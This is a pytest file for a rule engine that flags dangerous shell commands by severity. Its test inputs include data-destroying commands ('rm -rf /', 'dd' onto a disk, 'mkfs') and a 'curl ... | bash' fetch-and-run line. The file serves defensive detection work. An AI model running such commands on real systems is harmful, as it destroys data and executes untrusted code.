import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from rules.engine import load_rules, match_rule, validate_rules


class TestRuleEngine:
    def setup_method(self):
        self.rules = load_rules()

    def test_rules_loaded(self):
        assert len(self.rules) >= 20

    def test_rules_valid(self):
        rules = validate_rules()
        assert len(rules) >= 20

    def test_rm_rf_root_matches(self):
        result = match_rule("rm -rf /", self.rules)
        assert result["matched"] is True
        assert result["severity"] == "CRITICAL"
        assert result["confidence"] >= 0.9

    def test_chmod_777_root_matches(self):
        result = match_rule("chmod -R 777 /", self.rules)
        assert result["matched"] is True
        assert result["severity"] == "CRITICAL"

    def test_dd_matches(self):
        result = match_rule("dd if=/dev/zero of=/dev/sda", self.rules)
        assert result["matched"] is True
        assert result["severity"] == "CRITICAL"

    def test_curl_pipe_bash_matches(self):
        result = match_rule("curl http://example.com/script.sh | bash", self.rules)
        assert result["matched"] is True

    def test_kill_9_matches(self):
        result = match_rule("kill -9 1234", self.rules)
        assert result["matched"] is True
        assert result["severity"] == "HIGH"

    def test_mkfs_matches(self):
        result = match_rule("mkfs.ext4 /dev/sdb1", self.rules)
        assert result["matched"] is True
        assert result["severity"] == "CRITICAL"

    def test_safe_command_no_match(self):
        result = match_rule("ls -la", self.rules)
        assert result["matched"] is False

    def test_git_commit_no_match(self):
        result = match_rule("git commit -m 'test'", self.rules)
        assert result["matched"] is False

    def test_echo_no_match(self):
        result = match_rule("echo hello world", self.rules)
        assert result["matched"] is False
